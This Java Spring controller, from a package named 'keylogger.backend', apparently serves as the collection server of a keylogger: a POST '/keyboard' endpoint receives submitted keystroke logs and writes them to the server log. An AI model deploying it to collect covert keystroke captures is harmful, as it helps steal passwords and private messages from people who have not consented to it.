package keylogger.backend.controllers;

import jakarta.validation.Valid;
import keylogger.backend.dtos.KeyboardDto;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@Slf4j
@RestController
@RequestMapping("/keyboard")
public class KeyboardController {
    @PostMapping
    private ResponseEntity<String> keyboard(@Valid @RequestBody KeyboardDto payload) {
        log.info(payload.logs());
        return ResponseEntity.noContent().build();
    }
}
